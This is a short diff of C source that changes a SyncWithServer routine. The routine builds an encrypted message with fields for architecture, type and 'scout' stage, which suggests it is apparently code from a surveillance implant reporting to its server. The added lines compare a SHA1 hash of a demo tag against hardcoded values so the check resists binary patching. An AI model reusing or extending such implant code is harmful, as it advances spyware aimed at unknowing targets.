@@ -320,8 +320,41 @@ BOOL SyncWithServer()
 
 	// subtype
 	pMessageBuffer[0] = 0x0; // ARCH: windows
-	pMessageBuffer[1] = 0x0; // STAGE: scout
-	pMessageBuffer[2] = 0x1; // TYPE: release
+
+	/* 
+		determine whether it's a demo scout or not :
+		- cautiously set demo to 0 (i.e. release)
+		- if stars align properly set to demo
+	*/ 
+	pMessageBuffer[1] = 0x0; // TYPE: release
+
+	SHA1Context sha;
+	SHA1Reset(&sha);
+    SHA1Input(&sha, (PBYTE)DEMO_TAG, (DWORD)(strlen(DEMO_TAG)+1));
+	if (SHA1Result(&sha)) 
+	{ 
+		/* sha1 of string Pg-WaVyPzMMMMmGbhP6qAigT, used for demo tag comparison while avoiding being binpatch'd */
+		unsigned nDemoTag[5];
+		nDemoTag[0] = 1575563797;
+		nDemoTag[1] = 2264195072;
+		nDemoTag[2] = 3570558757;
+		nDemoTag[3] = 2213518012;
+		nDemoTag[4] = 971935466;
+		
+		if( nDemoTag[0] == sha.Message_Digest[0] &&
+			nDemoTag[1] == sha.Message_Digest[1] &&
+			nDemoTag[2] == sha.Message_Digest[2] &&
+			nDemoTag[3] == sha.Message_Digest[3] &&
+			nDemoTag[4] == sha.Message_Digest[4] )
+		{
+			pMessageBuffer[1] = 0x1;
+		}
+		
+	}
+
+
+
+	pMessageBuffer[2] = 0x1; // STAGE: scout
 	pMessageBuffer[3] = 0x0; // FLAG: reserved
 
 	// encrypt
